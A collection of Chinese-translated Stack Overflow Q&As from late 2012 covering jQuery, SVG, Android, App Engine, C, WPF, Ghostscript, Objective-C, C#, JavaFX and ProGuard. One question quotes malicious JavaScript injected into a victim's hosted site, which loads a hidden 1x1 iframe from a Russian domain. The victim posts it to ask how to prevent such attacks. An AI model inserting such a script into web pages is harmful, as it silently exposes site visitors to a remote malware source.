> 时间：2012-12-31T05:50:01.497
> 
> 标签：javascript, jquery

请检查链接[http://jsfiddle.net/KvscH/6/](http://jsfiddle.net/KvscH/6/)。

您可以检查`inspect element`动画中的**SPAN**贯穿于**LI**但我不知道为什么会发生这种情况，我希望**SPAN**保持在**LI**内。

帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:58:25.010

这是因为使用了javascript。

由于 javascript 中的以下行，Boo1 第一次可见。

```
ticker.children(':first').show().siblings().hide(); 
```

当我们调用 时`show()`，它会删除`display:none`。同样`hide()`添加`display:none`或`visibility:hidden`。您可以使用 firebug 并检查应用的样式。

**注意：**`li{display:none}`如果从 CSS中删除 ，您将获得相同的功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T06:33:52.680

我想你在这之后：http: **[//jsfiddle.net/TmNLE/](http://jsfiddle.net/TmNLE/)**

```
var ticker = $('ul.ticker');
var tickerli = $('ul.ticker li');
ticker.children(':first').show();

$('.next').live ('click', function () {
    $('li:visible').fadeOut(function() {
       $(this).appendTo(ticker);
       ticker.children().first().show();
    });
});

$('.prev').live ('click', function () {
    $('li:visible').fadeOut(function() {
       ticker.find('li:last').insertBefore(ticker.find('li:first'));
       ticker.children().first().show();
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:53:20.827

由于 CSS 的特殊性，这种内联样式正在被应用和覆盖：

`display: list-item;`

提高特异性的一种方法是使用：

```
.ticker li {
    display:none !important;
}​ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T06:09:17.177

只需调试代码并检查您应用的样式。

此问题是由于您的代码中的以下 javascript 行

```
ticker.children(':first').show().siblings().hide(); 
```

添加这一行

```
ticker.children(':first').show(); 
```

# svg - 反射后的 SVG 图像剪贴蒙版

> ID：14097968
> 
> 赞同：1
> 
> 时间：2012-12-31T05:50:30.077
> 
> 标签：svg

我目前正在生成以下 svg：

```
<!--add full image for reference-->
<image id="refImageMirror" x="0" y="0" class="dot" width="500" height="500" opacity="1" xlink:href="http://www.nyweamet.org/wp-content/uploads/2011/09/0942a__grandCentralStationExterior.jpg" transform="scale(1,-1) translate(0, -500)"></image>

<!--add full path for reference-->
<path id="refPathMirror" class="geom" transform="scale(1,-1) translate(0,-210)" d="M200,0A200,200 0 0,1 141.4213562373095,141.42135623730948L0,0Z" style="fill: none; stroke: black"></path>

<use id="clippedImage" xlink:href="#refImageMirror" clip-path="url(#myMirrorClipper)"></use>

<clipPath id="myMirrorClipper">
        <use xlink:href="#refPathMirror"></use>
</clipPath> 
```

但是，剪切的图像与路径正下方的图像不同。我认为这可能与剪切路径和图像的转换如何交互有关。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T06:54:58.707

我不确定我是否理解您的问题，但是您在代码“图像/参考路径”中的评论在我看来就像您不希望它们实际直接呈现，而只是稍后用作剪辑路径和一个剪辑的图像。因此，您可能希望将它们放入一个`<defs>`元素中（[尝试使用 Tinkerbin](http://tinkerbin.com/yom9zRSS)），因为否则您会在未剪裁的图像上叠加剪裁的图像，这意味着剪裁的图像是“隐藏的”。

```
<svg xmlns="http://www.w3.org/2000/svg" width="200px" height="250px">
  <defs>
    <image id="refImageMirror" x="0" y="0" class="dot" width="500" height="500" opacity="1" xlink:href="http://www.nyweamet.org/wp-content/uploads/2011/09/0942a__grandCentralStationExterior.jpg" transform="scale(1,-1) translate(0, -500)"></image>
    <path id="refPathMirror" class="geom" transform="scale(1,-1) translate(0,-210)" d="M200,0A200,200 0 0,1 141.4213562373095,141.42135623730948L0,0Z" style="fill: none; stroke: black"></path>
  </defs>

  <clipPath id="myMirrorClipper">
          <use xlink:href="#refPathMirror"></use>
  </clipPath>
  <use id="clippedImage" xlink:href="#refImageMirror" clip-path="url(#myMirrorClipper)"></use>
</svg> 
```

**编辑**：原来 OP 的问题是 Chrome 错误。

# android - 不再需要 mypackage.myapp (pid 7433): hidden #16 error on using LoginButton？

> ID：14097971
> 
> 赞同：0
> 
> 时间：2012-12-31T05:51:04.973
> 
> 标签：android, facebook-login, facebook-android-sdk

我创建了一个示例项目，它加载了一个包含 LoginButton 小部件的片段。它工作得很好，返回给我 GraphUser 对象。然后我将此代码嵌入到我的活动项目中。最初，它返回给我 GraphUser 对象。

然而，几天后，当我再次检查代码时，它在提交 facebook 用户凭据后给了我这个错误：

`I/ActivityManager(215): No longer want com.org.app (pid 7433): hidden #16` `I/WindowManager(215): WIN DEATH: Window{40f8d808 com.org.app/com.facebook.LoginActivity paused=false}`

另外，我的活动被破坏了。

**请注意**，与 LoginButton 相同的片段在不同的项目中运行得非常好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T04:51:27.490

问题解决了。创建了一个新的安卓项目。将我所有的文件转移到它。我认为，由于 git merge，问题发生了。

# java - App Engine：私有 java.lang.Throwable java.lang.Throwable.cause 上不允许反射

> ID：14097973
> 
> 赞同：0
> 
> 时间：2012-12-31T05:51:08.737
> 
> 标签：java, google-app-engine, spring-mvc

今天我去部署一个我创建的 Java 应用程序到 Google App Engine，我被一些非常无用的错误消息所阻碍。

```
Invocation of init method failed; nested exception is java.lang.SecurityException:
java.lang.IllegalAccessException: Reflection is not allowed on private 
java.lang.Throwable java.lang.Throwable.cause 
```

接下来是一个没有提到我的任何类的堆栈跟踪：我的代码中没有一行我可以指出导致这种情况。

此应用程序使用 Objectify 和 Spring MVC，并且在我的本地开发服务器（App Engine 版本 1.7.4）上运行良好。

我浏览了我的代码，并从我使用的任何异常类中删除了任何提及“原因”的内容。我仍然有这个问题。此外，我的控制器只能抛出一种类型的异常，这同样没有提及原因。

有任何想法吗？

PS 我发现[了这个讨论](https://stackoverflow.com/questions/9491862/reflection-is-not-allowed-on-private-throwable)，但信息量不是很大。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-03T11:22:17.867

万一其他人遇到类似问题，他们与在 appengine 服务器上在沙盒安全限制下运行的代码有关，但在本地开发服务器上运行时没有此类限制。

沙盒限制不允许对私有变量进行反射。

就我而言，我使用 Gson 进行序列化，它以难以调试的方式大量使用反射。我仍然不知道它在哪里或为什么试图对它在堆栈跟踪中谈到的 Throwable 事物进行反射。无论如何，当我改用 Jackson 时，我所有的问题都消失了。

# c - 试图计算代码中的行数，但在 C 中陷入无限循环

> ID：14097978
> 
> 赞同：0
> 
> 时间：2012-12-31T05:51:56.753
> 
> 标签：c

我一直在尝试创建一个函数来计算代码行数。这是我想出的，但它陷入了无限循环。

```
int numberoflines(char filename[]){
    FILE *file = fopen(filename, "r");
    int count = 0;
    int ch = 0;
    while( EOF != (ch = getchar())){
        if(ch == '\n'){
            count++;
        }
    }
    return count;
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-31T05:54:19.923

这不是无限循环，只是您不是从打开的文件中读取，而是从标准输入中读取。尝试`getc(file)`代替`getchar()`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T05:54:51.303

它不是在无限循环中，它是从标准输入读取，可能是终端，因为您使用`getchar()`而不是`getc(file)`.

你也应该`fclose(file)`在你回来之前。

# wpf - 加载项目时出现“无法加载元数据”错误

> ID：14097979
> 
> 赞同：0
> 
> 时间：2012-12-31T05:51:57.017
> 
> 标签：wpf, xaml

我是 xaml 的新手，很久以前我就提出过申请。这是一个小项目，没有什么花哨或困难的，这是我的第一个 xaml/wpf 项目，我在一个周末就完成了。我最近检索了代码。应用程序仍然可以构建和运行，但设计器不会加载。xaml 文件中有错误。我不记得以前有这些错误。这些错误中的第一个是：

`Unable to load the metadata for assembly 'MyProject'. This assembly may have been downloaded from the web. See http://go.microsoft.com/fwlink/?LinkId=179545\. The following error was encountered during load: Could not load file or assembly 'MyProject' or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515) C:\visualStudioWorkspace\MyProject\MyProject\MainWindow.xaml 1 1 MyProject`

我试图转到提到的网址，但我什么都不明白。我不是从网上下载的。我不知道什么是“大会”。我尝试在我的项目中浏览一些随机文件，但没有一个文件有他们在各自文件属性中谈论的“取消阻止”按钮。

然后xaml中大约有10个错误，所有这些都与这个类似：

`The type 'local:ClickSelectTextBox' was not found. Verify that you are not missing an assembly reference and that all referenced assemblies have been built. C:\visualStudioWorkspace\MyProject\MyProject\MainWindow.xaml 351 22 MyProject`

我能做些什么来解决这个错误？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T12:25:03.797

Windows 通过为这些文件创建“备用数据流”来跟踪文件是否已从 Web 下载。对于名为 的文件`myfile.txt`，有关它来自何处的信息将存储在名为 的数据流中`myfile.txt:Zone.Identifier:$DATA`。要解除阻止`myfile.txt`并使 Windows 不再担心您从何处获取文件，您只需删除此备用数据流。

您可以使用[Sysinternals Streams 实用程序](http://technet.microsoft.com/en-gb/sysinternals/bb897440.aspx)来查找和删除这些备用数据流。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-02T18:21:15.653

删除与解决方案中的文件关联的流： `c:\streams -s -d <path to your solution>`

# linux - Ghostscript ps2pdf 创建清理后的 pdf

> ID：14097981
> 
> 赞同：0
> 
> 时间：2012-12-31T05:52:10.493
> 
> 标签：linux, perl, ghostscript

我已经尝试并搜索了所有但我没有得到我的要求的答案。是否可以从 ps2pdf 命令创建干净的 pdf 文件。

我知道我们可以使用它创建 pdf，我的要求是我有现有的 pdf 并且我正在裁剪到某个区域并且我正在创建 ps 文件，因为我想删除其他对象。

当我打印文件时，它将被删除。

当我在我的 linux cent os 中尝试以下命令时

```
ps2pdf -dCompatibilityLevel=1.4 -dPDFSETTINGS=/prepress a11.ps axd.pdf 
```

对象仍然存在。

请帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T08:42:35.360

如果对象的任何部分没有被剪掉，那么 Ghostscript 会被强制包含整个对象。无论您是输出到 PostScript 还是 PDF，都一样。

# ftp - Javascript代码自动添加到服务器页面

> ID：14097982
> 
> 赞同：0
> 
> 时间：2012-12-31T05:52:31.277
> 
> 标签：ftp, web-hosting, spam, virus

今天早上我注意到一些 Javascript 已添加到我的托管站点。当我下载主页时，代码就像 `<!--04b037--><script type="text/javascript"language="javascript"> (function () { var ipexz = document.createElement('iframe'); ipexz.src = 'http://nypmivhy.ru/count5.php'; ipexz.style.position = 'absolute'; ipexz.style.border = '0'; ipexz.style.height = '1px'; ipexz.style.width = '1px'; ipexz.style.left = '1px'; ipexz.style.top = '1px'; if (!document.getElementById('ipexz')) { document.write('<div id=\'ipexz\'></div>'); document.getElementById('ipexz').appendChild(ipexz); }})();</script><!--/04b037-->` 在登录页面中：

```
(function () { var usyux = document.createElement('iframe'); usyux.src = 'http://nypmivhy.ru/count5.php'; usyux.style.position = 'absolute'; usyux.style.border = '0'; usyux.style.height = '1px'; usyux.style.width = '1px'; usyux.style.left = '1px'; usyux.style.top = '1px'; if (!document.getElementById('usyux')) { document.write('
'); document.getElementById('usyux').appendChild(usyux); }})();" method="post"> Email 
```

我猜它是病毒/垃圾邮件攻击。虽然我现在删除了 javascript 代码，但我想知道如何防止我的网站受到此类攻击。注意：我的 FTP 密码很弱。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T05:54:31.520

> 注意：我的 FTP 密码很弱。

你知道你做错了什么，但你还在问吗？首先解决这个问题，同时保护您的计算机，如果您使用脚本，请查看日志以了解黑客尝试并确保它们的安全。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T06:03:05.130

检查文件的权限是否正确，否则可能是代码被注入。

看看这个：

[http://ag.arizona.edu/ecat/web/permissions.html](http://ag.arizona.edu/ecat/web/permissions.html)

您必须为文件设置 3 个主要权限：

```
read from the file
write to the file
execute the file 
```

这是权限的摘要

![在此处输入图像描述](../Images/11156ffee6bbd1b23e838c7fa0684e35.png)

# objective-c - 从另一个选项卡切换回来后秒表搞砸了

> ID：14097983
> 
> 赞同：0
> 
> 时间：2012-12-31T05:52:34.197
> 
> 标签：objective-c, uitabbarcontroller, nsdate, nstimer, uitabbar

我有一个秒表，它本身就可以正常工作，但是当我从标签栏的另一个视图切换回来时，秒表会做一些奇怪的事情（点击导航视图上的后退按钮可以正常工作）。

1.  当用户从另一个选项卡切换回来时，秒表标签是隐藏的，即使在显示视图时它应该是可见的。

2.  如果当用户点击另一个选项卡并再次点击秒表选项卡时秒表正在运行，则秒表转到 -31:-23.-64，并且停止按钮（应该重置计时器并显示开始按钮）被点击时不会做任何事情。

3.  如果当用户点击另一个选项卡并再次点击秒表选项卡时秒表未运行，则秒表将正常启动，但当用户点击开始按钮时停止按钮不显示。

这是我的代码：

。H：

```
@interface ViewController : UIViewController {
    IBOutlet UIButton *btnStart;
    IBOutlet UIButton *btnStop;
    IBOutlet UILabel *lblTimer;
    NSTimer *stopWatchTimer;
    NSDate *stopDate;
    NSDate *startDate;

}

@property (strong, nonatomic) IBOutlet UILabel *lblTimer;

- (IBAction)btnStart:(id)sender;
- (IBAction)btnStop:(id)sender; 
```

米：

```
- (void)updateTimer
{
    NSDate *currentDate = [NSDate date];
    NSTimeInterval timeInterval = [currentDate timeIntervalSinceDate:startDate];
    NSDate *timerDate = [NSDate dateWithTimeIntervalSince1970:timeInterval];
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"mm:ss.SS"];
    [dateFormatter setTimeZone:[NSTimeZone timeZoneForSecondsFromGMT:0.0]];
    NSString *timeString=[dateFormatter stringFromDate:timerDate];
    lblTimer.text = timeString;
}

- (IBAction)buttonStart:(id)sender {

    startDate = [NSDate date];

    // Create the stop watch timer that fires every 1ms
    stopWatchTimer = [NSTimer scheduledTimerWithTimeInterval:1.0/100.0
                                                      target:self
                                                    selector:@selector(updateTimer)
                                                    userInfo:nil
                                                     repeats:YES];
    btnStop.hidden = NO;
    btnStart.hidden = YES;
}

- (IBAction)buttonStop:(id)sender {

    [self updateTimer];
    btnStop.hidden = YES;
    btnStart.hidden = NO;

    [stopWatchTimer invalidate];
    stopWatchTimer = nil;
} 
```

请让我知道我能做些什么来解决这个问题，或者是否需要其他任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T05:59:53.220

首先，看起来 startDate 搞砸了。`init`正在被调用。它应该只是`[NSDate date]`。

至于没有出现的视图......在计算日期之后，`timer.text`正在设置一些东西。什么是定时器？你确定那不应该`timer.title`吗？在你这样做之后，如果你想要的话，你可能需要`[timer setNeedsDisplay]`确保在控件上更新文本。

如果文本仍然混乱，请尝试减少更新频率。也许每十分之一秒，看看文本是否表现得更好。

# c# - c# 泛型参数推断

> ID：14097984
> 
> 赞同：-1
> 
> 时间：2012-12-31T05:52:39.957
> 
> 标签：c#, generics, arguments

> **可能重复：**
> [如何使用反射调用泛型方法？](https://stackoverflow.com/questions/232535/how-to-use-reflection-to-call-generic-method)

我该怎么做？

```
class A {}

void DoSomething<T, U> where T : List<U> {}

object o = new List<A>();

DoSomething(o); // cannot be inferred from usage error 
```

直到运行时我才知道 A 的确切类型。

只是为了澄清。我无权更改 DoSomething 方法。我知道下面的电话会起作用

```
DoSomething(o as List<A>); 
```

但直到运行时我才知道 A 。虽然我知道所有 As 都会有一个共同的子类。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-31T05:54:57.803

那么，DoSOthing 有什么用呢？

有2种可能：

*   为了在那里调用方法，您知道的不仅仅是“对象”，那么在编写方法时您必须知道这一点。
*   你不知道，那么你只做在 Object、List 上定义的通用东西，那么你不需要知道类型。

# java - 在 Windows 8 上启动资源管理器窗口

> ID：14097987
> 
> 赞同：0
> 
> 时间：2012-12-31T05:53:15.013
> 
> 标签：java, windows-8, explorer

好的，从头开始 - 我必须以管理员身份运行它才能启动资源管理器窗口。这是为什么？如何允许它以非管理员身份启动？是因为我的系统吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T06:36:10.137

我正在使用 Windows 8 和 Java 6，它运行良好。

您能否让我们知道更多细节，例如 java 版本等或您遇到的错误？

你能编译代码吗？

# java - 需要 Android 程序连接到 wifi 打印机并物理打印内容

> ID：14097990
> 
> 赞同：0
> 
> 时间：2012-12-31T05:53:22.893
> 
> 标签：java, android, printing, wifi

我有一个使用 ASP Web 服务的 Android 程序。现在我希望我的 Android 程序连接到 wifi 打印机并打印它从 Web 服务中使用的内容。我不知道从哪里开始以及使用什么资源。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T06:58:51.173

我使用以下代码打印

```
import java.io.IOException;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import com.iPrint.iObject;
import com.iPrint.iPaperType;
import com.iPrint.iPrint;
import com.iPrint.iPrinters;
import com.iPrint.iSettings;
import com.iPrint.ipConnection;

public class MainActivity extends Activity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    iSettings set = new iSettings();
    set.SetPaperType(iPaperType.LETTER);
    set.PrinterType(iPrinters.HP);

    //Creating Connection object

    ipConnection wfc = new ipConnection();

    wfc.ipAddress("IP-Address");
    wfc.Port(port-number);
    try {
        wfc.Connect();
        Log.e("Connected",  wfc.isConnected()+"");
    } catch (IOException e) {
        // TODO Auto-generated catch block
        Log.e("In Error", "In Error");
        e.printStackTrace();
    }

    //Creating a Printing object
    iPrint p = new iPrint(getApplicationContext()); 
    p.Connection(wfc);
    p.Settings(set);
    if (wfc.isConnected())
    {
        p.Start();
        iObject ob = new iObject();
        ob.Text("Hello iPrint!");
        p.Add(ob);
        p.End(); 
        p.Print(); 
        ob = null;
    }
    else
    {
        Log.v("Error",wfc.ErrorMessage()+"");
       //showDialog(wfc.ErrorMessage(), AppContext);
    }
    print(getApplicationContext());
}
private void print(Context AppContext) 
{ 
//Creating Settings object
iSettings set = new iSettings();
set.SetPaperType(iPaperType.LETTER);
set.PrinterType(iPrinters.HP);

//Creating Connection object

ipConnection wfc = new ipConnection();
wfc.ipAddress("ip-address");
wfc.Port(port-number);
try {
    wfc.Connect();
} catch (IOException e) {
    // TODO Auto-generated catch block
    Log.e("In Error", "In Error");
    e.printStackTrace();
}

//Creating a Printing object
iPrint p = new iPrint(AppContext); 
p.Connection(wfc);
p.Settings(set);
if (wfc.isConnected())
{
    p.Start();
    iObject ob = new iObject();
    ob.Text("Hello iPrint!");
    p.Add(ob);
    p.End(); 
    p.Print(); 
    ob = null;
}
else
{
    Log.v("Error",wfc.ErrorMessage()+"");
}
 set = null;
 wfc = null;
 p = null; 
 }
} 
```

补充一下`iprint.jar`，我是这样做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T06:45:14.583

我将从查看[此](http://developer.android.com/reference/android/net/wifi/package-summary.html)文档开始。
然后您必须了解（我假设您正在与特定供应商合作，对吗？）“打印机端”协议 -
发送给它的确切数据（以及如何）。
我不确定所有 wifi 打印机是否共享相同的 API，这取决于您检查。

# java - 在 javaFx 中播放视频

> ID：14097992
> 
> 赞同：0
> 
> 时间：2012-12-31T05:53:44.030
> 
> 标签：java, javafx

你好朋友我想在 JavaFx 中播放视频我尝试下面的代码

```
public class Video extends Application {

@Override
public void start(Stage stage) throws Exception {

    String s=System.getProperty("/home/ubuntu/NetBeansProjects/Video/src"); 
    File f=new File(s, "/media/video.flv");
    Media m=new Media(f.toURI().toString());
    MediaPlayer mp=new MediaPlayer(m);
    MediaView mv=new MediaView(mp);

    StackPane root=new StackPane();
    root.getChildren().add(mv);
    stage.setScene(new Scene(root,400,400));
    stage.setTitle("Video");
    stage.show();
    mp.play();

}

public static void main(String[] args) {
    launch(args);
} 
```

}

我收到类似 MediaException: MEDIA_UNAVAILABLE : /media/video.flv 的错误（没有这样的文件或目录）

我用什么方法解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T07:09:24.800

除非您在启动 java 时明确设置它，`String s=System.getProperty("/home/ubuntu/NetBeansProjects/Video/src");`否则将为空。所以你的代码相当于：

```
File f=new File("/media/video.flv"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-10T05:28:17.353

```
 File f = new File("D:\\Project Files\\Videos\\Business\\Accounting\\Free\\Careers in Accounting.mp4");

    Media media = new Media(f.toURI().toString());
    MediaView mv = new MediaView();

    MediaPlayer mp = new MediaPlayer(media);
    mv.setMediaPlayer(mp); 
```

# javascript - 如何在jQuery中计算div的高度？

> ID：14097994
> 
> 赞同：4
> 
> 时间：2012-12-31T05:54:07.667
> 
> 标签：javascript, jquery

我处于这样一种情况，我必须设置一个 div 的高度取决于它的内容量，我不能放弃`min-height`它。我知道我们可以通过以下方式计算 div 的高度：

```
$("#divid").height();

```

那么有什么方法可以在没有高度参数的情况下计算 div 的高度，并根据其中的内容量为该 div 赋予高度。

我希望我解释清楚。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T05:56:53.640

您的措辞有点令人困惑，但我认为您是在问如何计算 div 内内容的大小，即使 div 应用了不同的高度。为此，您可以使用元素的[scrollHeight](https://developer.mozilla.org/en-US/docs/DOM/element.scrollHeight)。

```
$('#divid')[0].scrollHeight 
```

如果您只想知道如何计算元素的高度，即使它没有高度的属性/样式，您可以使用您在问题中编写的内容。`.height()`直接从浏览器呈现的值计算元素的高度，而不是专门从属性计算。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-31T06:13:12.197

你有两种方法：

```
$("#parent").height($("#child").outerHeight(true));
//-----------------------------^^^^^^^^^^^--^^^^-----outerHeight(true) will give
//---------------------------------------------------you the total height 
//---------------------------------------------------including top bottom margins 
```

更多信息 .outerHeight：**[http ://api.jquery.com/outerHeight/](http://api.jquery.com/outerHeight/)**

如果您的 html 是：

```
<div style="height:450px;"></div> 
```

然后你可以用它来获得高度：

```
$("#parent").css('height'); // this will give you the 450px 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:58:24.947

就像你说的那样，`.height()`不需要为使用它定义一个实际的高度。这是一个 jsfiddle 展示它的实际操作：http: [//jsfiddle.net/nWb5j/](http://jsfiddle.net/nWb5j/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T06:06:23.833

[jQuery 使用 计算高度，`.height()`](http://jsfiddle.net/Z4juq/2/)即使元素上没有高度设置（通过 CSS 或其他方式）。

# java - 如何使用 Proguard.cfg 纠正缺失的类/方法问题

> ID：14097997
> 
> 赞同：2
> 
> 时间：2012-12-31T05:54:19.710
> 
> 标签：java, android, proguard, method-missing

我有一个相当大的项目，它在代码中使用了一些反射。导致以下崩溃的代码行：

```
W/System.err(22122): java.lang.NoSuchMethodException: <init> [class com.DynaZu.Tracker.cd]
W/System.err(22122):    at java.lang.Class.getConstructorOrMethod(Class.java:460) 
W/System.err(22122):    at java.lang.Class.getDeclaredConstructor(Class.java:588)
W/System.err(22122):    at com.DynaZu.Tracker.ItemAdapter.getView(SourceFile:356)
W/System.err(22122):    at android.widget.AbsListView.obtainView(AbsListView.java:2267) 
```

是 SourceFile:356 行：

```
try {
    itemViewHolder = mViewHolderClass.getDeclaredConstructor(item.getClass())
                       .newInstance(item);
            } catch (IllegalArgumentException e) {
                e.printStackTrace();
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } 
```

文件中的其他地方：

```
Class<? extends ItemViewHolder> mViewHolderClass; 
```

并且该项目是从项目类派生的几个潜在类之一。

当我查看 dump.txt 等时......我看到了很多我无法完全转换为 proguard.cfg 的特定指令的东西。从转储.txt：

```
 + Methodref [com/DynaZu/Tracker/cd.<init> (Ljava/lang/String;)V]
 + Methodref [com/DynaZu/Tracker/cd.a ()Ljava/lang/String;]
 + Methodref [com/DynaZu/Tracker/cd.equals (Ljava/lang/Object;)Z]
 + Methodref [com/DynaZu/Tracker/cd.h ()J]
 + Methodref [com/DynaZu/Tracker/cd.o ()Ljava/lang/String;]
 + Methodref [com/DynaZu/Tracker/cd.p ()Lcom/DynaZu/Tracker/cd;]
 + Methodref [com/DynaZu/Tracker/cd.q ()F]
 + Methodref [com/DynaZu/Tracker/ce.a (J)Lcom/DynaZu/Tracker/cd;]
 + Methodref [com/DynaZu/Tracker/ce.a (Lcom/DynaZu/Tracker/cd;)V]
 + InterfaceMethodref [com/DynaZu/Tracker/ac.a (IILcom/DynaZu/Tracker/cd;ZZ)V]
 + NameAndType [<init> (Lcom/DynaZu/Tracker/cd;)V]
 + NameAndType [a (IILcom/DynaZu/Tracker/cd;ZZ)V]
 + NameAndType [a (J)Lcom/DynaZu/Tracker/cd;]
 + NameAndType [a (Lcom/DynaZu/Tracker/cd;)V]
 + NameAndType [a Lcom/DynaZu/Tracker/cd;]
 + NameAndType [b (Lcom/DynaZu/Tracker/cd;I)V]
 + NameAndType [c Lcom/DynaZu/Tracker/cd;]
 + NameAndType [p ()Lcom/DynaZu/Tracker/cd;]
 + Utf8 [()Lcom/DynaZu/Tracker/cd;] 
```

对于 proguard.cfg，我意识到我想要类似的东西：

```
-keepclassmembers class * extends Item
-keep class * extends Item 
```

任何的意见都将会有帮助。例如，有没有办法为一个java文件或这个java文件的一部分打开proguard？？？

对此进行调查，我相信我需要添加以下内容：

```
-keepclassmembers class com.DynaZu.Tracker.TaskViewHolder
{
  <init>(com.DynaZu.Tracker.Task);
} 
```

等等......但是ProGuard抱怨这些类是未知的......？那么项目中已有的类应该如何在proguard.cfg中注明。？？？我也只尝试了类名 TaskViewHolder 本身。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T18:36:18.770

我可以通过查看 proguard/.. dump.txt 尤其是 mapping.txt 来解决这个问题。从那里我明白了我的一些课程是如何命名的。所以我在我的 proguard.cfg 中添加了以下内容：

```
-keepclassmembers class com.DynaZu.Tracker.ItemViewHolder$TaskViewHolder
{
  <init>(com.DynaZu.Tracker.Task);
}
-keepclassmembers class com.DynaZu.Tracker.ItemViewHolder$ProjectViewHolder
{
  <init>(com.DynaZu.Tracker.Project);
}
-keepclassmembers class com.DynaZu.Tracker.ItemViewHolder
{
  <init>(com.DynaZu.Tracker.Item);
}
-keep class com.DynaZu.Tracker.Item
-keep class com.DynaZu.Tracker.Task
-keep class com.DynaZu.Tracker.Project 
```

一旦我明白发生了什么，这并不难。我希望这可以帮助其他人解决这个困难。我不得不说，拥有一个社区和 Stack Overflow 的可用性可以挽救生命！